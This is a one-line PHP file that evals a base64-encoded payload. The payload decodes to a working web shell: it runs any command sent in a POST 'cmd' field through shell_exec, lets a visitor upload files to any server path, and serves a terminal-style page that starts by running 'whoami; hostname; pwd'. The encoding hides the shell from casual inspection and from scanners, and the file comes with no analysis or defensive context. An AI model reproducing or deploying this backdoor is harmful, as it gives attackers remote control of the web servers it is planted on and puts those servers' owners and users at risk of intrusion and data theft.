<?php eval("?>".base64_decode("Ly8KPD9waHAKaWYgKElTU0VUKCRfUE9TVFsnY21kJ10pKSB7CiAgICAkb3V0cHV0ID0gcHJlZ19zcGxpdCgnL1tcbl0vJywgc2hlbGxfZXhlYygkX1BPU1RbJ2NtZCddLiIgMj4mMSIpKTsKICAgIGZvcmVhY2ggKCRvdXRwdXQgYXMgJGxpbmUpIHsKICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygkbGluZSwgRU5UX1FVT1RFUyB8IEVOVF9IVE1MNSwgJ1VURi04JykgLiAiPGJyPiI7CiAgICB9CiAgICBkaWUoKTsgCn0gZWxzZSBpZiAoIWVtcHR5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSkgJiYgIWVtcHR5KCRfUE9TVFsncGF0aCddKSkgewogICAgJGZpbGVuYW1lID0gJF9GSUxFU1siZmlsZSJdWyJuYW1lIl07CiAgICAkcGF0aCA9ICRfUE9TVFsncGF0aCddOwogICAgaWYgKCRwYXRoICE9ICIvIikgewogICAgICAgICRwYXRoIC49ICIvIjsKICAgIH0gCiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXSwgJHBhdGguJGZpbGVuYW1lKSkgewogICAgICAgIGVjaG8gaHRtbGVudGl0aWVzKCRmaWxlbmFtZSkgLiAiIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZCB0byAiIC4gaHRtbGVudGl0aWVzKCRwYXRoKTsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiRXJyb3IgdXBsb2FkaW5nICIgLiBodG1sZW50aXRpZXMoJGZpbGVuYW1lKTsKICAgIH0KICAgIGRpZSgpOwp9Cj8+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT48L3RpdGxlPgogICAgICAgIDxzdHlsZT4KICAgICAgICAgICAgaHRtbCwgYm9keSB7CiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IDEwMCU7CiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgYm9keSB7CiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgICAgIGhlaWdodDogMTAwJTsKICAgICAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGJvZHksIC5pbnB1dHRleHQgewogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6ICJMdWNpZGEgQ29uc29sZSIsICJMdWNpZGEgU2FucyBUeXBld3JpdGVyIiwgbW9uYWNvLCAiQml0c3RyZWFtIFZlcmEgU2FucyBNb25vIiwgbW9ub3NwYWNlOwogICAgICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgICAgICAgICAgZm9udC1zdHlsZTogbm9ybWFsOwogICAgICAgICAgICAgICAgZm9udC12YXJpYW50OiBub3JtYWw7CiAgICAgICAgICAgICAgICBmb250LXdlaWdodDogNDAwOwogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7CiAgICAgICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgICAgIC5jb25zb2xlIHsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOwogICAgICAgICAgICAgICAgbWFyZ2luOiBhdXRvOwogICAgICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC5vdXRwdXQgewogICAgICAgICAgICAgICAgd2lkdGg6IGF1dG87CiAgICAgICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgICAgICBvdmVyZmxvdy15OiBzY3JvbGw7CiAgICAgICAgICAgICAgICB0b3A6IDA7CiAgICAgICAgICAgICAgICBib3R0b206IDMwcHg7CiAgICAgICAgICAgICAgICBsZWZ0OiA1cHg7CiAgICAgICAgICAgICAgICByaWdodDogMDsKICAgICAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4OwogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAuaW5wdXQgZm9ybSB7CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAwcHg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIC51c2VybmFtZSB7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsKICAgICAgICAgICAgICAgIHBhZGRpbmctbGVmdDogNXB4OwogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICBmbG9hdDogbGVmdDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLmlucHV0IHsKICAgICAgICAgICAgICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjMzMzMzMzOwogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgICAgICBib3R0b206IDA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC5pbnB1dHRleHQgewogICAgICAgICAgICAgICAgd2lkdGg6IGF1dG87CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICBib3R0b206IDBweDsKICAgICAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDBweDsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDA7CiAgICAgICAgICAgICAgICBib3JkZXI6IDA7CiAgICAgICAgICAgICAgICBmbG9hdDogbGVmdDsKICAgICAgICAgICAgICAgIHBhZGRpbmctbGVmdDogOHB4OwogICAgICAgICAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC5pbnB1dHRleHQ6Zm9jdXMgewogICAgICAgICAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgOjotd2Via2l0LXNjcm9sbGJhciB7CiAgICAgICAgICAgICAgICB3aWR0aDogMTJweDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgOjotd2Via2l0LXNjcm9sbGJhci10cmFjayB7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMTAxMDEwOwogICAgICAgICAgICB9CgogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iIHsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMzMDMwMzA7IAogICAgICAgICAgICB9CiAgICAgICAgPC9zdHlsZT4KICAgIDwvaGVhZD4KICAgIDxib2R5PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnNvbGUiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJvdXRwdXQiIGlkPSJvdXRwdXQiPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dCIgaWQ9ImlucHV0Ij4KICAgICAgICAgICAgICAgIDxmb3JtIGlkPSJmb3JtIiBtZXRob2Q9IkdFVCIgb25TdWJtaXQ9InNlbmRDb21tYW5kKCkiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InVzZXJuYW1lIiBpZD0idXNlcm5hbWUiPjwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iaW5wdXR0ZXh0IiBpZD0iaW5wdXR0ZXh0IiB0eXBlPSJ0ZXh0IiBuYW1lPSJjbWQiIGF1dG9jb21wbGV0ZT0ib2ZmIiBhdXRvZm9jdXM+CiAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxmb3JtIGlkPSJ1cGxvYWQiIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIGlkPSJmaWxlYnJvd3NlciIgb25jaGFuZ2U9J3VwbG9hZEZpbGUoKScgLz4KICAgICAgICA8L2Zvcm0+CiAgICAgICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgICAgICB2YXIgdXNlcm5hbWUgPSAiIjsKICAgICAgICAgICAgdmFyIGhvc3RuYW1lID0gIiI7CiAgICAgICAgICAgIHZhciBjdXJyZW50RGlyID0gIiI7CiAgICAgICAgICAgIHZhciBwcmV2aW91c0RpciA9ICIiOwogICAgICAgICAgICB2YXIgZGVmYXVsdERpciA9ICIiOwogICAgICAgICAgICB2YXIgY29tbWFuZEhpc3RvcnkgPSBbXTsKICAgICAgICAgICAgdmFyIGN1cnJlbnRDb21tYW5kID0gMDsKICAgICAgICAgICAgdmFyIGlucHV0VGV4dEVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaW5wdXR0ZXh0Jyk7CiAgICAgICAgICAgIHZhciBpbnB1dEVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaW5wdXQiKTsKICAgICAgICAgICAgdmFyIG91dHB1dEVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgib3V0cHV0Iik7CiAgICAgICAgICAgIHZhciB1c2VybmFtZUVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidXNlcm5hbWUiKTsKICAgICAgICAgICAgdmFyIHVwbG9hZEZvcm1FbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVwbG9hZCIpOwogICAgICAgICAgICB2YXIgZmlsZUJyb3dzZXJFbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZpbGVicm93c2VyIik7CiAgICAgICAgICAgIGdldFNoZWxsSW5mbygpOwogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gZ2V0U2hlbGxJbmZvKCkgewogICAgICAgICAgICAgICAgdmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcnNlZFJlc3BvbnNlID0gcmVxdWVzdC5yZXNwb25zZVRleHQuc3BsaXQoIjxicj4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBwYXJzZWRSZXNwb25zZVswXTsKICAgICAgICAgICAgICAgICAgICAgICAgaG9zdG5hbWUgPSBwYXJzZWRSZXNwb25zZVsxXTsKICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudERpciA9ICBwYXJzZWRSZXNwb25zZVsyXS5yZXBsYWNlKG5ldyBSZWdFeHAoIiZzb2w7IiwgImciKSwgIi8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdERpciA9IGN1cnJlbnREaXI7CiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lRWxlbWVudC5pbm5lckhUTUwgPSAiPGRpdiBzdHlsZT0nY29sb3I6ICNmZjAwMDA7IGRpc3BsYXk6IGlubGluZTsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj46IitjdXJyZW50RGlyKyIjIjsKICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSW5wdXRXaWR0aCgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgcmVxdWVzdC5vcGVuKCJQT1NUIiwgIiIsIHRydWUpOwogICAgICAgICAgICAgICAgcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CiAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoImNtZD13aG9hbWk7IGhvc3RuYW1lOyBwd2QiKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gc2VuZENvbW1hbmQoKSB7CiAgICAgICAgICAgICAgICB2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICAgICAgdmFyIGNvbW1hbmQgPSBpbnB1dFRleHRFbGVtZW50LnZhbHVlOwogICAgICAgICAgICAgICAgdmFyIG9yaWdpbmFsQ29tbWFuZCA9IGNvbW1hbmQ7CiAgICAgICAgICAgICAgICB2YXIgb3JpZ2luYWxEaXIgPSBjdXJyZW50RGlyOwogICAgICAgICAgICAgICAgdmFyIGNkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNvbW1hbmRIaXN0b3J5LnB1c2gob3JpZ2luYWxDb21tYW5kKTsKICAgICAgICAgICAgICAgIHN3aXRjaENvbW1hbmQoY29tbWFuZEhpc3RvcnkubGVuZ3RoKTsKICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQudmFsdWUgPSAiIjsKCiAgICAgICAgICAgICAgICB2YXIgcGFyc2VkQ29tbWFuZCA9IGNvbW1hbmQuc3BsaXQoIiAiKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKHBhcnNlZENvbW1hbmRbMF0gPT0gImNkIikgewogICAgICAgICAgICAgICAgICAgIGNkID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VkQ29tbWFuZC5sZW5ndGggPT0gMSkgewogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrZGVmYXVsdERpcisiOyBwd2QiOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocGFyc2VkQ29tbWFuZFsxXSA9PSAiLSIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiK3ByZXZpb3VzRGlyKyI7IHB3ZCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiK2N1cnJlbnREaXIrIjsgIitjb21tYW5kKyI7IHB3ZCI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzBdID09ICJjbGVhciIpIHsKICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCA9ICIiOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocGFyc2VkQ29tbWFuZFswXSA9PSAidXBsb2FkIikgewogICAgICAgICAgICAgICAgICAgIGZpbGVCcm93c2VyRWxlbWVudC5jbGljaygpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiK2N1cnJlbnREaXIrIjsgIiArIGNvbW1hbmQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcnNlZFJlc3BvbnNlID0gcmVxdWVzdC5yZXNwb25zZVRleHQuc3BsaXQoIjxicj4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZXZpb3VzRGlyID0gY3VycmVudERpcjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnREaXIgPSBwYXJzZWRSZXNwb25zZVswXS5yZXBsYWNlKG5ldyBSZWdFeHAoIiZzb2w7IiwgImciKSwgIi8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9ICI8ZGl2IHN0eWxlPSdjb2xvcjojZmYwMDAwOyBmbG9hdDogbGVmdDsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj48ZGl2IHN0eWxlPSdmbG9hdDogbGVmdDsnPiIrIjoiK29yaWdpbmFsRGlyKyIjICIrb3JpZ2luYWxDb21tYW5kKyI8L2Rpdj48YnI+IjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lRWxlbWVudC5pbm5lckhUTUwgPSAiPGRpdiBzdHlsZT0nY29sb3I6ICNmZjAwMDA7IGRpc3BsYXk6IGlubGluZTsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj46IitjdXJyZW50RGlyKyIjIjsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9ICI8ZGl2IHN0eWxlPSdjb2xvcjojZmYwMDAwOyBmbG9hdDogbGVmdDsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj48ZGl2IHN0eWxlPSdmbG9hdDogbGVmdDsnPiIrIjoiK2N1cnJlbnREaXIrIiMgIitvcmlnaW5hbENvbW1hbmQrIjwvZGl2Pjxicj4iICsgcmVxdWVzdC5yZXNwb25zZVRleHQucmVwbGFjZShuZXcgUmVnRXhwKCI8YnI+PGJyPiQiKSwgIjxicj4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuc2Nyb2xsVG9wID0gb3V0cHV0RWxlbWVudC5zY3JvbGxIZWlnaHQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUlucHV0V2lkdGgoKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgIHJlcXVlc3Qub3BlbigiUE9TVCIsICIiLCB0cnVlKTsKICAgICAgICAgICAgICAgIHJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwogICAgICAgICAgICAgICAgcmVxdWVzdC5zZW5kKCJjbWQ9IitlbmNvZGVVUklDb21wb25lbnQoY29tbWFuZCkpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiB1cGxvYWRGaWxlKCkgewogICAgICAgICAgICAgICAgdmFyIGZvcm1EYXRhID0gbmV3IEZvcm1EYXRhKCk7CiAgICAgICAgICAgICAgICBmb3JtRGF0YS5hcHBlbmQoJ2ZpbGUnLCBmaWxlQnJvd3NlckVsZW1lbnQuZmlsZXNbMF0sIGZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXS5uYW1lKTsKICAgICAgICAgICAgICAgIGZvcm1EYXRhLmFwcGVuZCgncGF0aCcsIGN1cnJlbnREaXIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgewogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCArPSByZXF1ZXN0LnJlc3BvbnNlVGV4dCsiPGJyPiI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oIlBPU1QiLCAiIiwgdHJ1ZSk7CiAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoZm9ybURhdGEpOwogICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgKz0gIjxkaXYgc3R5bGU9J2NvbG9yOiNmZjAwMDA7IGZsb2F0OiBsZWZ0Oyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjxkaXYgc3R5bGU9J2Zsb2F0OiBsZWZ0Oyc+IisiOiIrY3VycmVudERpcisiIyBVcGxvYWRpbmcgIitmaWxlQnJvd3NlckVsZW1lbnQuZmlsZXNbMF0ubmFtZSsiLi4uPC9kaXY+PGJyPiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwZGF0ZUlucHV0V2lkdGgoKSB7CiAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnN0eWxlLndpZHRoID0gaW5wdXRFbGVtZW50LmNsaWVudFdpZHRoIC0gdXNlcm5hbWVFbGVtZW50LmNsaWVudFdpZHRoIC0gMTU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGRvY3VtZW50Lm9ua2V5ZG93biA9IGNoZWNrRm9yQXJyb3dLZXlzOwoKICAgICAgICAgICAgZnVuY3Rpb24gY2hlY2tGb3JBcnJvd0tleXMoZSkgewogICAgICAgICAgICAgICAgZSA9IGUgfHwgd2luZG93LmV2ZW50OwoKICAgICAgICAgICAgICAgIGlmIChlLmtleUNvZGUgPT0gJzM4JykgewogICAgICAgICAgICAgICAgICAgIHByZXZpb3VzQ29tbWFuZCgpOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChlLmtleUNvZGUgPT0gJzQwJykgewogICAgICAgICAgICAgICAgICAgIG5leHRDb21tYW5kKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHByZXZpb3VzQ29tbWFuZCgpIHsKICAgICAgICAgICAgICAgIGlmIChjdXJyZW50Q29tbWFuZCAhPSAwKSB7CiAgICAgICAgICAgICAgICAgICAgc3dpdGNoQ29tbWFuZChjdXJyZW50Q29tbWFuZC0xKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gbmV4dENvbW1hbmQoKSB7CiAgICAgICAgICAgICAgICBpZiAoY3VycmVudENvbW1hbmQgIT0gY29tbWFuZEhpc3RvcnkubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgc3dpdGNoQ29tbWFuZChjdXJyZW50Q29tbWFuZCsxKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gc3dpdGNoQ29tbWFuZChuZXdDb21tYW5kKSB7CiAgICAgICAgICAgICAgICBjdXJyZW50Q29tbWFuZCA9IG5ld0NvbW1hbmQ7CgogICAgICAgICAgICAgICAgaWYgKGN1cnJlbnRDb21tYW5kID09IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQudmFsdWUgPSAiIjsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1ZSA9IGNvbW1hbmRIaXN0b3J5W2N1cnJlbnRDb21tYW5kXTsKICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGlucHV0VGV4dEVsZW1lbnQuc2VsZWN0aW9uU3RhcnQgPSBpbnB1dFRleHRFbGVtZW50LnNlbGVjdGlvbkVuZCA9IDEwMDAwOyB9LCAwKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZvcm0iKS5hZGRFdmVudExpc3RlbmVyKCJzdWJtaXQiLCBmdW5jdGlvbihldmVudCl7CiAgICAgICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpCiAgICAgICAgICAgIH0pOwogICAgICAgIDwvc2NyaXB0PgogICAgPC9ib2R5Pgo8L2h0bWw+Cg==")); ?>
